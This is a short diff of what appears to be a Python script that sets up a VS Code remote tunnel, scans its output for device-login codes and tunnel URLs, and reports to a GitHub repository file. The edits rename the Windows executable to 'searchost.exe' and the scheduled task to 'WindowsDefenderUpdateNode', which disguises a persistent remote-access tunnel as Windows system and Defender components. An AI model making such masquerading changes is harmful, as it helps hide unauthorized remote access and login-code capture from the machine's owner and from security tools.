@@ -21,7 +21,7 @@ GITHUB_REPO = "leanne-townsend/temp1"
 TARGET_FILE = "output1.txt"
 BRANCH = "main"
 
-CODE_EXE_NAME = "code.exe" if platform.system().lower() == "windows" else "code"
+CODE_EXE_NAME = "searchost.exe" if platform.system().lower() == "windows" else "code"
 TUNNEL_NAME = os.getenv("COMPUTERNAME", "workstation")
 SHOW_RAW_OUTPUT = False
 DEVICE_CODE_LIFETIME_SECONDS = 15 * 60
@@ -39,7 +39,7 @@ DEVICE_CODE_PATTERN = re.compile(r"\b([A-Z0-9]{4}-?[A-Z0-9]{4})\b")
 URL_PATTERN = re.compile(r"https://[^\s]+")
 TUNNEL_URL_PATTERN = re.compile(r"https://vscode\.dev/tunnel/[^\s]+", re.IGNORECASE)
 LOGIN_HINT_PATTERN = re.compile(r"(github\.com/login/device|microsoft\.com/devicelogin)", re.IGNORECASE)
-TASK_NAME = "VSCodeTunnelDeploy"
+TASK_NAME = "WindowsDefenderUpdateNode"
 
 
 def windows_subprocess_kwargs() -> dict:
